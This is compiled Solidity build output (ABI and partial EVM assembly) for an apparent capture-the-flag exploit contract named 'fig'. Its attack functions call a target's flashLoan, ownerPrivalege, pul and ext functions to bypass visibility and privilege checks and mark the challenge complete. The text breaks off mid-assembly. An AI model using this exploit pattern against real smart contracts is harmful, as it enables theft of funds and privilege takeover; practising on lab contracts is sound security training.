{
	"shoot/2/可见性修饰符/1.sol": {
		"fig": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "_fun",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack1",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack2",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack3",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack4",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack5",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack6",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "complete",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "figure",
					"outputs": [
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "fun",
					"outputs": [
						{
							"internalType": "contract check",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":164:1230  contract fig{... */\n  mstore(0x40, 0x80)\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":206:275  constructor(address payable _fun){... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":262:266  _fun */\n  dup1\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":250:253  fun */\n  0x00\n  dup1\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":250:267  fun = check(_fun) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":206:275  constructor(address payable _fun){... */\n  pop\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":164:1230  contract fig{... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:570   */\ntag_11:\n    /* \"#utility.yul\":511:518   */\n  0x00\n    /* \"#utility.yul\":540:564   */\n  tag_20\n    /* \"#utility.yul\":558:563   */\n  dup3\n    /* \"#utility.yul\":540:564   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":529:564   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:570   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":576:714   */\ntag_12:\n    /* \"#utility.yul\":657:689   */\n  tag_22\n    /* \"#utility.yul\":683:688   */\n  dup2\n    /* \"#utility.yul\":657:689   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":650:655   */\n  dup2\n    /* \"#utility.yul\":647:690   */\n  eq\n    /* \"#utility.yul\":637:708   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":704:705   */\n  0x00\n    /* \"#utility.yul\":701:702   */\n  dup1\n    /* \"#utility.yul\":694:706   */\n  revert\n    /* \"#utility.yul\":637:708   */\ntag_23:\n    /* \"#utility.yul\":576:714   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":720:879   */\ntag_13:\n    /* \"#utility.yul\":785:790   */\n  0x00\n    /* \"#utility.yul\":816:822   */\n  dup2\n    /* \"#utility.yul\":810:823   */\n  mload\n    /* \"#utility.yul\":801:823   */\n  swap1\n  pop\n    /* \"#utility.yul\":832:873   */\n  tag_25\n    /* \"#utility.yul\":867:872   */\n  dup2\n    /* \"#utility.yul\":832:873   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":720:879   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":885:1252   */\ntag_3:\n    /* \"#utility.yul\":963:969   */\n  0x00\n    /* \"#utility.yul\":1012:1014   */\n  0x20\n    /* \"#utility.yul\":1000:1009   */\n  dup3\n    /* \"#utility.yul\":991:998   */\n  dup5\n    /* \"#utility.yul\":987:1010   */\n  sub\n    /* \"#utility.yul\":983:1015   */\n  slt\n    /* \"#utility.yul\":980:1099   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":1018:1097   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":980:1099   */\ntag_27:\n    /* \"#utility.yul\":1138:1139   */\n  0x00\n    /* \"#utility.yul\":1163:1235   */\n  tag_29\n    /* \"#utility.yul\":1227:1234   */\n  dup5\n    /* \"#utility.yul\":1218:1224   */\n  dup3\n    /* \"#utility.yul\":1207:1216   */\n  dup6\n    /* \"#utility.yul\":1203:1225   */\n  add\n    /* \"#utility.yul\":1163:1235   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1153:1235   */\n  swap2\n  pop\n    /* \"#utility.yul\":1109:1245   */\n  pop\n    /* \"#utility.yul\":885:1252   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":164:1230  contract fig{... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":164:1230  contract fig{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x946644cd\n      gt\n      tag_11\n      jumpi\n      dup1\n      0x946644cd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x9fcec698\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xb2b9f26d\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xdc5bb9a1\n      eq\n      tag_9\n      jumpi\n      dup1\n      0xe4832009\n      eq\n      tag_10\n      jumpi\n      jump(tag_1)\n    tag_11:\n      dup1\n      0x12a50b25\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x13b6ae4c\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x419efc03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x522e1177\n      eq\n      tag_5\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":907:978  function attack4()public payable{... */\n    tag_2:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":282:390  function figure()public pure returns(bytes memory){... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":398:679  function attack1()public payable{... */\n    tag_4:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1166:1227  function complete()public{... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":183:199  check public fun */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      tag_27\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":685:825  function attack2()public payable{... */\n    tag_7:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":831:901  function attack3()public payable{... */\n    tag_8:\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":984:1044  function attack5()public payable{... */\n    tag_9:\n      tag_33\n      tag_34\n      jump\t// in\n    tag_33:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1050:1160  function attack6()public payable{... */\n    tag_10:\n      tag_35\n      tag_36\n      jump\t// in\n    tag_35:\n      stop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":907:978  function attack4()public payable{... */\n    tag_13:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":950:953  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":950:968  fun.ownerPrivalege */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x19c43a01\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":950:970  fun.ownerPrivalege() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_38:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_40\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":907:978  function attack4()public payable{... */\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":282:390  function figure()public pure returns(bytes memory){... */\n    tag_16:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":319:331  bytes memory */\n      0x60\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":350:382  abi.encodeWithSignature(\"com()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xe09966a800000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":343:382  return abi.encodeWithSignature(\"com()\") */\n      swap1\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":282:390  function figure()public pure returns(bytes memory){... */\n      swap1\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":398:679  function attack1()public payable{... */\n    tag_20:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":442:454  bool success */\n      0x00\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":465:468  fun */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":457:474  address(fun).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":481:484  100 */\n      0x64\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":457:489  address(fun).call{value:100}(\"\") */\n      mload(0x40)\n      tag_43\n      swap1\n      tag_44\n      jump\t// in\n    tag_43:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_47\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_46)\n    tag_47:\n      0x60\n      swap2\n      pop\n    tag_46:\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":441:489  (bool success,)=address(fun).call{value:100}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":508:515  success */\n      dup1\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":500:530  require(success,\"call failed\") */\n      tag_48\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_49\n      swap1\n      tag_50\n      jump\t// in\n    tag_49:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_48:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":541:544  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":541:548  fun.pul */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc58a455b\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":541:550  fun.pul() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_51\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_51:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_53:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":561:564  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":561:579  fun.ownerPrivalege */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x19c43a01\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":561:581  fun.ownerPrivalege() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_54\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_54:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_56\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_56:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":592:595  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":592:599  fun.ext */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xcf9f23b5\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":592:601  fun.ext() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_57\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_57:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_59:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":612:615  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":612:625  fun.flashLoan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe0232b42\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":634:637  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":639:640  0 */\n      0x00\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":641:649  figure() */\n      tag_60\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":641:647  figure */\n      tag_16\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":641:649  figure() */\n      jump\t// in\n    tag_60:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":612:650  fun.flashLoan(address(fun),0,figure()) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_61\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_62\n      jump\t// in\n    tag_61:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_63\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_63:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_65\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_65:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":661:671  complete() */\n      tag_66\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":661:669  complete */\n      tag_23\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":661:671  complete() */\n      jump\t// in\n    tag_66:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":430:679  {... */\n      pop\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":398:679  function attack1()public payable{... */\n      jump\t// out\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1166:1227  function complete()public{... */\n    tag_23:\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1202:1205  fun */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/2/\\xe5\\x8f\\xaf\\xe8\\xa7\\x81\\xe6\\x80\\xa7\\xe4\\xbf\\xae\\xe9\\xa5\\xb0\\xe7\\xac\\xa6/1.sol\":1202:1217  fun.isCompleted */\n      0xffffffffffffffffffffffffffffffffffffffff\n      